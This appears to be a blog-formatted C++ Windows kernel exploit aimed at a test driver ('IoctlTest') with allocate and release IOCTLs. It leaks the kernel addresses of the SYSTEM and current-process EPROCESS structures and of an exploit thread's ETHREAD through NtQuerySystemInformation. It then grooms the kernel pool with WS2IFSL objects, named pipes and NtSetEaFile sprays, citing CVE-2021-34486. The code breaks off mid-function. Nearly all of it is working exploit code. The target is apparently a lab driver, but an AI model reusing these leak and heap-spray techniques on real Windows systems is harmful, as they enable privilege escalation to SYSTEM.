<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winternl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;ntdll&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Device </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEVICE            <span class="string">L&quot;\\\\.\\IoctlTest&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTL_ALLOCATE32  0x9C402400</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTL_RELEASE32   0x9C402408</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTL_ALLOCATE64  0x9C402404</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTL_RELEASE64   0x9C40240C</span></span><br><span class="line"></span><br><span class="line">HANDLE g_hDevice;</span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">Allocate64</span><span class="params">(ULONG uSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//wprintf(L&quot;[+] Allocate64\r\n&quot;);</span></span><br><span class="line">	BYTE szInbuffer[<span class="number">4</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	BYTE szOutBuffer[<span class="number">12</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	*(PULONG)szInbuffer = uSize;</span><br><span class="line">	DWORD dwBytesReturned;</span><br><span class="line">	BOOL ret = FALSE;</span><br><span class="line">	ret = <span class="built_in">DeviceIoControl</span>(</span><br><span class="line">		g_hDevice, </span><br><span class="line">		IOCTL_ALLOCATE64, </span><br><span class="line">		szInbuffer, <span class="built_in">sizeof</span>(szInbuffer), </span><br><span class="line">		szOutBuffer, <span class="built_in">sizeof</span>(szOutBuffer), </span><br><span class="line">		&amp;dwBytesReturned, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (FALSE == ret)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">wprintf</span>(<span class="string">L&quot;[-] Error IOCTL_ALLOCATE64\r\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">Allocate32</span><span class="params">(ULONG uSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//wprintf(L&quot;[+] Allocate32\r\n&quot;);</span></span><br><span class="line">	BYTE szInbuffer[<span class="number">4</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	BYTE szOutBuffer[<span class="number">8</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	*(PULONG)szInbuffer = uSize;</span><br><span class="line">	DWORD dwBytesReturned;</span><br><span class="line">	BOOL ret = FALSE;</span><br><span class="line">	ret = <span class="built_in">DeviceIoControl</span>(</span><br><span class="line">		g_hDevice,</span><br><span class="line">		IOCTL_ALLOCATE32,</span><br><span class="line">		szInbuffer, <span class="built_in">sizeof</span>(szInbuffer),</span><br><span class="line">		szOutBuffer, <span class="built_in">sizeof</span>(szOutBuffer),</span><br><span class="line">		&amp;dwBytesReturned, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (FALSE == ret)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">wprintf</span>(<span class="string">L&quot;[-] Error IOCTL_ALLOCATE32\r\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//if (!ulInputBufferLength || !ulOutputBufferLength)</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//	v3 = 0xC000000D;</span></span><br><span class="line"><span class="comment">//	goto LABEL_34;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="function">VOID <span class="title">Free64</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//wprintf(L&quot;[+] Free64\r\n&quot;);</span></span><br><span class="line">	BYTE buffer[] = <span class="string">&quot;h5&quot;</span>;</span><br><span class="line">	BOOL ret = FALSE;</span><br><span class="line">	DWORD dwBytesReturned = <span class="number">0</span>;</span><br><span class="line">	ret = <span class="built_in">DeviceIoControl</span>(</span><br><span class="line">		 g_hDevice, </span><br><span class="line">		IOCTL_RELEASE64, </span><br><span class="line">		buffer, <span class="built_in">sizeof</span>(buffer), </span><br><span class="line">		buffer, <span class="built_in">sizeof</span>(buffer), </span><br><span class="line">		&amp;dwBytesReturned, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (FALSE == ret)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">wprintf</span>(<span class="string">L&quot;Error IOCTL_RELEASE64\r\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// wprintf(L&quot;first free succeeded, dwOutput = %d\n&quot;, dwOutput);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">Free32</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//wprintf(L&quot;[+] Free32\r\n&quot;);</span></span><br><span class="line">	BYTE buffer[] = <span class="string">&quot;h5&quot;</span>;</span><br><span class="line">	BOOL ret = FALSE;</span><br><span class="line">	DWORD dwBytesReturned = <span class="number">0</span>;</span><br><span class="line">	ret = <span class="built_in">DeviceIoControl</span>(</span><br><span class="line">		g_hDevice,</span><br><span class="line">		IOCTL_RELEASE32,</span><br><span class="line">		buffer, <span class="built_in">sizeof</span>(buffer),</span><br><span class="line">		buffer, <span class="built_in">sizeof</span>(buffer),</span><br><span class="line">		&amp;dwBytesReturned, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (FALSE == ret)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">wprintf</span>(<span class="string">L&quot;Error IOCTL_RELEASE32\r\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Get Kernel Infomation</span></span><br><span class="line">ULONG64   g_SystemEprocess;</span><br><span class="line">ULONG64   g_CurrentEprocess;</span><br><span class="line">ULONG64   g_ExploitEthread;</span><br><span class="line"></span><br><span class="line">HANDLE    g_ThreadExploitHandle;</span><br><span class="line">DWORD     g_CurrentPid;</span><br><span class="line"></span><br><span class="line"><span class="comment">// NtQuerySystemInfomation Leak Information</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_SYSTEM_HANDLE_TABLE_ENTRY_INFO</span> &#123;</span><br><span class="line">	USHORT UniqueProcessId;</span><br><span class="line">	USHORT CreatorBackTraceIndex;</span><br><span class="line">	UCHAR ObjectTypeIndex;</span><br><span class="line">	UCHAR HandleAttributes;</span><br><span class="line">	USHORT HandleValue;</span><br><span class="line">	PVOID Object;</span><br><span class="line">	ULONG GrantedAccess;</span><br><span class="line">	LONG __PADDING__[<span class="number">1</span>];</span><br><span class="line">&#125; SYSTEM_HANDLE_TABLE_ENTRY_INFO, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_SYSTEM_HANDLE_INFORMATION</span> &#123;</span><br><span class="line">	ULONG NumberOfHandles;</span><br><span class="line">	SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[<span class="number">1</span>];</span><br><span class="line">&#125; SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SystemModuleInformation			(SYSTEM_INFORMATION_CLASS)0x0b</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SystemHandleInformation			(SYSTEM_INFORMATION_CLASS)0x10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STATUS_INFO_LENGTH_MISMATCH      ((NTSTATUS)0xC0000004L)</span></span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">LeakByQuerySystemInfomation</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DWORD CurPid = <span class="built_in">GetCurrentProcessId</span>();</span><br><span class="line">	g_CurrentPid = CurPid;</span><br><span class="line">	<span class="comment">// Process</span></span><br><span class="line">	HANDLE hSelf = <span class="built_in">OpenProcess</span>(PROCESS_QUERY_INFORMATION, <span class="number">0</span>, CurPid);</span><br><span class="line">	<span class="keyword">if</span> (hSelf == INVALID_HANDLE_VALUE || hSelf == <span class="literal">NULL</span>) </span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">wprintf</span>(<span class="string">L&quot;[-] Error OpenProcess\r\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// kthread and ktoken</span></span><br><span class="line">	PSYSTEM_HANDLE_INFORMATION HandleInfo = (PSYSTEM_HANDLE_INFORMATION)<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">	ULONG OutBufLen = <span class="number">0</span>;</span><br><span class="line">	NTSTATUS status = <span class="built_in">NtQuerySystemInformation</span>(SystemHandleInformation, HandleInfo, <span class="number">0x100</span>, &amp;OutBufLen);</span><br><span class="line">	<span class="keyword">if</span> (status == STATUS_INFO_LENGTH_MISMATCH) </span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">free</span>(HandleInfo);</span><br><span class="line">		HandleInfo = (SYSTEM_HANDLE_INFORMATION*)<span class="built_in">malloc</span>(OutBufLen);</span><br><span class="line">		status = <span class="built_in">NtQuerySystemInformation</span>(SystemHandleInformation, HandleInfo, OutBufLen, &amp;OutBufLen);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (HandleInfo == <span class="literal">NULL</span>) </span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">wprintf</span>(<span class="string">L&quot;[-] Error NtQuerySystemInformation SystemHandleInformation\r\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// PID 当前进程 Handle 没有指定</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; HandleInfo-&gt;NumberOfHandles; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		SYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = (SYSTEM_HANDLE_TABLE_ENTRY_INFO)HandleInfo-&gt;Handles[i];</span><br><span class="line">		<span class="keyword">if</span> (handleInfo.UniqueProcessId == CurPid)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">wprintf</span>(<span class="string">L&quot;[*] PID %d\tObject %#llx\n&quot;</span>, handleInfo.UniqueProcessId, (ULONG64)handleInfo.Object);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 找到 ExploitThread 的ETHREAD</span></span><br><span class="line">	<span class="comment">// 找到System的 EPROCESS</span></span><br><span class="line">	<span class="comment">// 找到当前进程的 EPROCESS</span></span><br><span class="line">	<span class="keyword">for</span> (ULONG i = <span class="number">0</span>; i &lt; HandleInfo-&gt;NumberOfHandles; i++) </span><br><span class="line">	&#123;</span><br><span class="line">		SYSTEM_HANDLE_TABLE_ENTRY_INFO HandleEntry = (SYSTEM_HANDLE_TABLE_ENTRY_INFO)HandleInfo-&gt;Handles[i];</span><br><span class="line">		<span class="keyword">if</span> (HandleEntry.UniqueProcessId == CurPid &amp;&amp; HandleEntry.HandleValue == (ULONG)g_ThreadExploitHandle)</span><br><span class="line">		&#123;</span><br><span class="line">			g_ExploitEthread = (ULONG64)HandleEntry.Object;</span><br><span class="line">			<span class="built_in">wprintf</span>(<span class="string">L&quot;[*] Exploit thread PID: %d\thandle: %#x\t_KTHREAD: %#llx\n&quot;</span>, HandleEntry.UniqueProcessId, HandleEntry.HandleValue, g_ExploitEthread);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 当前进程 Eprocess</span></span><br><span class="line">		<span class="keyword">if</span> (HandleEntry.UniqueProcessId == CurPid &amp;&amp; HandleEntry.HandleValue == (ULONG)hSelf) </span><br><span class="line">		&#123;</span><br><span class="line">			g_CurrentEprocess = (ULONG64)HandleEntry.Object;</span><br><span class="line">			<span class="built_in">wprintf</span>(<span class="string">L&quot;[*] Current PID: %d\thandle: %#x\t_EPROCESS: %#llx\n&quot;</span>, HandleEntry.UniqueProcessId, (ULONG)hSelf, g_CurrentEprocess);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// System 进程 Eprocess</span></span><br><span class="line">		<span class="keyword">if</span> (HandleEntry.UniqueProcessId == <span class="number">0x4</span> &amp;&amp; HandleEntry.HandleValue == <span class="number">0x4</span>) </span><br><span class="line">		&#123; <span class="comment">// SYSTEM Process has a handle to itself</span></span><br><span class="line">			g_SystemEprocess = (ULONG64)HandleEntry.Object;</span><br><span class="line">			<span class="built_in">wprintf</span>(<span class="string">L&quot;[*] System _EPROCESS: 0x%llx\r\n&quot;</span>, g_SystemEprocess);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (g_ExploitEthread != <span class="number">0</span> &amp;&amp; g_CurrentEprocess != <span class="number">0</span> &amp;&amp; g_SystemEprocess) </span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">free</span>(HandleInfo);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// Get kthread and ktoken</span></span><br><span class="line">	<span class="keyword">if</span> (g_ExploitEthread == <span class="number">0</span> || g_CurrentEprocess == <span class="number">0</span> || g_SystemEprocess == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">wprintf</span>(<span class="string">L&quot;[-] Error Leak\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// ws2ifsl</span></span><br><span class="line"><span class="comment">// wdm.h</span></span><br><span class="line"><span class="comment">// 结构提供扩展属性 (EA) 信息</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_FILE_FULL_EA_INFORMATION</span></span><br><span class="line">&#123;</span><br><span class="line">	ULONG NextEntryOffset;</span><br><span class="line">	UCHAR Flags;</span><br><span class="line">	UCHAR EaNameLength;</span><br><span class="line">	USHORT EaValueLength;</span><br><span class="line">	CHAR EaName[<span class="number">1</span>];</span><br><span class="line">&#125; FILE_FULL_EA_INFORMATION, * PFILE_FULL_EA_INFORMATION;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_PROC_DATA</span></span><br><span class="line">&#123;</span><br><span class="line">	HANDLE ApcThread;          <span class="comment">// 0x00</span></span><br><span class="line">	PVOID RequestQueueRoutine; <span class="comment">// 0x04</span></span><br><span class="line">	PVOID CancelQueueRoutine;  <span class="comment">// 0x08</span></span><br><span class="line">	PVOID ApcContext;          <span class="comment">// 0x0C</span></span><br><span class="line">	PVOID unknown3;            <span class="comment">// 0x10</span></span><br><span class="line">&#125; PROC_DATA, * PPROC_DATA;</span><br><span class="line"></span><br><span class="line">HANDLE g_ThreadApcHandle;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Spray Ws2P</span></span><br><span class="line"><span class="type">const</span> ULONG64 CountSprayWs2P      = <span class="number">0x100</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// spray NpFr</span></span><br><span class="line"><span class="type">const</span> ULONG64 CountSprayPipe      = <span class="number">0x100</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Spray tag IO</span></span><br><span class="line"><span class="type">const</span> ULONG64 CountSprayEaFile    = <span class="number">0x1000</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// set to cpu number later</span></span><br><span class="line">DWORD CountConcurrentSprayEaFile  = <span class="number">0x0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> ULONG64 CountSprayMm        = <span class="number">0x1000</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Ws2P Process</span></span><br><span class="line">HANDLE* g_ProcessList;</span><br><span class="line"></span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="function">HANDLE <span class="title">CreateProcessFileHandle</span><span class="params">(HANDLE hThreadApc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	UNICODE_STRING deviceName;</span><br><span class="line">	<span class="built_in">RtlInitUnicodeString</span>(&amp;deviceName, (PWSTR)<span class="string">L&quot;\\Device\\WS2IFSL\\NifsPvd&quot;</span>);</span><br><span class="line"></span><br><span class="line">	OBJECT_ATTRIBUTES object;</span><br><span class="line">	<span class="built_in">InitializeObjectAttributes</span>(&amp;object, &amp;deviceName, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	PFILE_FULL_EA_INFORMATION pFileEa =</span><br><span class="line">		(PFILE_FULL_EA_INFORMATION)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(FILE_FULL_EA_INFORMATION) + <span class="built_in">sizeof</span>(<span class="string">&quot;NifsPvd&quot;</span>) + <span class="built_in">sizeof</span>(PROC_DATA));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (pFileEa == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">wprintf</span>(<span class="string">L&quot;Error malloc\r\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	pFileEa-&gt;NextEntryOffset = <span class="number">0</span>;</span><br><span class="line">	pFileEa-&gt;Flags = <span class="number">0</span>;</span><br><span class="line">	pFileEa-&gt;EaNameLength = <span class="built_in">sizeof</span>(<span class="string">&quot;NifsPvd&quot;</span>) - <span class="number">1</span>;</span><br><span class="line">	pFileEa-&gt;EaValueLength = <span class="built_in">sizeof</span>(PROC_DATA);</span><br><span class="line">	<span class="built_in">memcpy</span>(pFileEa-&gt;EaName, <span class="string">&quot;NifsPvd&quot;</span>, pFileEa-&gt;EaNameLength + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	PPROC_DATA pProcData = (PPROC_DATA)((<span class="type">char</span>*)pFileEa + <span class="built_in">sizeof</span>(FILE_FULL_EA_INFORMATION) + <span class="built_in">sizeof</span>(<span class="string">&quot;NifsPvd&quot;</span>) - <span class="number">4</span>);</span><br><span class="line">	pProcData-&gt;ApcThread = hThreadApc;</span><br><span class="line">	pProcData-&gt;RequestQueueRoutine = (PVOID)<span class="number">0xaaaaaaaa</span>;</span><br><span class="line">	pProcData-&gt;CancelQueueRoutine = (PVOID)<span class="number">0xbbbbbbbb</span>;</span><br><span class="line">	pProcData-&gt;ApcContext = (PVOID)<span class="number">0xcccccccc</span>;</span><br><span class="line">	pProcData-&gt;unknown3 = (PVOID)<span class="number">0xdddddddd</span>;</span><br><span class="line"></span><br><span class="line">	HANDLE handle = INVALID_HANDLE_VALUE;</span><br><span class="line">	IO_STATUS_BLOCK IoStatusBlock;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// object -&gt; handle</span></span><br><span class="line">	NTSTATUS status = <span class="built_in">NtCreateFile</span>(</span><br><span class="line">		&amp;handle, </span><br><span class="line">		MAXIMUM_ALLOWED, </span><br><span class="line">		&amp;object, </span><br><span class="line">		&amp;IoStatusBlock, </span><br><span class="line">		<span class="literal">NULL</span>, FILE_ATTRIBUTE_NORMAL, <span class="number">0</span>, FILE_OPEN_IF, </span><br><span class="line">		<span class="number">0</span>,</span><br><span class="line">		pFileEa,</span><br><span class="line">		<span class="built_in">sizeof</span>(FILE_FULL_EA_INFORMATION) + <span class="built_in">sizeof</span>(<span class="string">&quot;NifsPvd&quot;</span>) + <span class="built_in">sizeof</span>(PROC_DATA)</span><br><span class="line">	);</span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">NT_ERROR</span>(status))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">wprintf</span>(<span class="string">L&quot;[-] Error NtCreateFile\r\n&quot;</span>);</span><br><span class="line">		<span class="built_in">free</span>(pFileEa);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">free</span>(pFileEa);</span><br><span class="line">	<span class="keyword">return</span> handle;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Io Pool</span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">APCThread</span><span class="params">(LPVOID lparam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">Sleep</span>(<span class="number">0x100</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// NpFr</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_PIPE_HANDLES</span> &#123;</span><br><span class="line">	HANDLE r;</span><br><span class="line">	HANDLE w;</span><br><span class="line">&#125; PIPE_HANDLES;</span><br><span class="line"></span><br><span class="line">std::vector&lt;PIPE_HANDLES&gt; g_Pipe;</span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">SprayPipe</span><span class="params">(ULONG size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">wprintf</span>(<span class="string">L&quot;[*] Spray NpFr begin...\r\n&quot;</span>);</span><br><span class="line">	ULONG payloadSize = size - <span class="number">0x40</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; CountSprayPipe; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		PIPE_HANDLES pipe;</span><br><span class="line">		UCHAR* payload = (UCHAR*)<span class="built_in">malloc</span>(payloadSize);</span><br><span class="line">		<span class="keyword">if</span> (payload == <span class="literal">NULL</span>) &#123;</span><br><span class="line">			<span class="built_in">wprintf</span>(<span class="string">L&quot;malloc failed, err: %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">memset</span>(payload, <span class="string">&#x27;p&#x27;</span>, payloadSize);</span><br><span class="line">		BOOL res = <span class="built_in">CreatePipe</span>(&amp;pipe.r, &amp;pipe.w, <span class="literal">NULL</span>, payloadSize);</span><br><span class="line">		<span class="keyword">if</span> (res == FALSE)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">wprintf</span>(<span class="string">L&quot;[-] Error CreatePipe\r\n&quot;</span>);</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		DWORD resultLength;</span><br><span class="line">		<span class="comment">// res = WriteFile(writePipe, payload, sizeof(payload), &amp;resultLength, NULL);</span></span><br><span class="line">		res = <span class="built_in">WriteFile</span>(pipe.w, payload, payloadSize, &amp;resultLength, <span class="literal">NULL</span>);</span><br><span class="line">		<span class="keyword">if</span> (res == FALSE)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">wprintf</span>(<span class="string">L&quot;Error WriteFile\r\n&quot;</span>);</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		g_Pipe.<span class="built_in">push_back</span>(pipe);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">wprintf</span>(<span class="string">L&quot;[*] Spray NpFr done!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(WINAPI* PNtSetEaFile)</span><span class="params">(HANDLE, PIO_STATUS_BLOCK, PVOID, ULONG)</span></span>;</span><br><span class="line">PNtSetEaFile NtSetEaFile;</span><br><span class="line"></span><br><span class="line"><span class="function">HANDLE <span class="title">Setup</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	g_hDevice = <span class="built_in">CreateFileW</span>(DEVICE, GENERIC_READ | GENERIC_WRITE, <span class="number">0</span>, <span class="literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (INVALID_HANDLE_VALUE == g_hDevice)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">wprintf</span>(<span class="string">L&quot;[-] Error CreateFileW DEVICE\r\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// wprintf(L&quot;Open device %s succeeded, handle: %p\n&quot;, DEVICE, ghDev);</span></span><br><span class="line"></span><br><span class="line">	g_ThreadApcHandle = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, APCThread, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (g_ThreadApcHandle == INVALID_HANDLE_VALUE)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">wprintf</span>(<span class="string">L&quot;[-] Error CreateThread\r\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	g_ProcessList = (HANDLE*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(HANDLE) * CountSprayWs2P);</span><br><span class="line">	<span class="keyword">if</span> (g_ProcessList == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">wprintf</span>(<span class="string">L&quot;[-] Error malloc g_ProcessList\r\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">RtlFillMemory</span>(g_ProcessList, <span class="built_in">sizeof</span>(HANDLE) * CountSprayWs2P, <span class="number">0xff</span>);</span><br><span class="line"></span><br><span class="line">	NtSetEaFile = (PNtSetEaFile)::<span class="built_in">GetProcAddress</span>(::<span class="built_in">LoadLibraryW</span>(<span class="string">L&quot;ntdll.dll&quot;</span>), <span class="string">&quot;NtSetEaFile&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (NtSetEaFile == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">wprintf</span>(<span class="string">L&quot;[-] Error GetProcAddress(NtSetEaFile)\r\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Io</span></span><br><span class="line"><span class="comment">// 通过 payloadSize 可以控制chunk的大小</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span></span><br><span class="line">&#123;</span><br><span class="line">	HANDLE hPEAuth;</span><br><span class="line">	UCHAR* payload;</span><br><span class="line">	ULONG PayloadSize;</span><br><span class="line">&#125; ParamSprayEaFile;</span><br><span class="line"></span><br><span class="line">HANDLE* g_EaThreadList;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadSprayEaFile</span><span class="params">(LPVOID param)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ParamSprayEaFile* _param = (ParamSprayEaFile*)param;</span><br><span class="line">	IO_STATUS_BLOCK iostatus;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; CountSprayEaFile; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">NtSetEaFile</span>(_param-&gt;hPEAuth, &amp;iostatus, _param-&gt;payload, _param-&gt;PayloadSize);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// EaFile =&gt; Io</span></span><br><span class="line"><span class="comment">// 详情：CVE-2021-34486</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">SprayEaFile</span><span class="params">(ULONG 